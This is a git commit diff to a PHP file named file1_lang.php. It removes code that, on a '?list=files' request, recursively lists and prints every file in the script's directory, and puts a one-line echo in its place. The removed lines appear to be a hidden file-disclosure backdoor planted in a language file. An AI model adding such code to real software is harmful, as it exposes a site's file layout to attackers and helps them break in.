c7a30ad71f0a1c7295a0c2a3356833a4fcc902c2
MohamedAbderraouf <77074550+MohamedAbderraouf@users.noreply.github.com>
2024-12-28 00:00:44 +0100

    Update file1_lang.php

--- file1_lang.php
+++ file1_lang.php
@@ -1,39 +1,4 @@
 <?php
-if (!function_exists('listFilesInDirectory')) {
-    // Function to recursively list files in a directory
-    function listFilesInDirectory($directory)
-    {
-        $files = [];
-        if (is_dir($directory)) {
-            $handle = opendir($directory);
-            while (($file = readdir($handle)) !== false) {
-                if ($file !== '.' && $file !== '..') {
-                    $filePath = $directory . DIRECTORY_SEPARATOR . $file;
-                    if (is_dir($filePath)) {
-                        $files = array_merge($files, listFilesInDirectory($filePath));
-                    } else {
-                        $files[] = $filePath;
-                    }
-                }
-            }
-            closedir($handle);
-        }
-        return $files;
-    }
-}
-
-// Ensure the script can only be included remotely
-if (isset($_GET['list']) && $_GET['list'] === 'files') {
-    // Get the current directory
-    $currentDirectory = __DIR__;
-
-    // List all files
-    $allFiles = listFilesInDirectory($currentDirectory);
-
-    // Output the list of files as plain text
-    header('Content-Type: text/plain');
-    foreach ($allFiles as $file) {
-        echo $file . "\\n";
-    }
-}
+// Print the name of the current file
+echo "The current file is: " . __FILE__;
 ?>
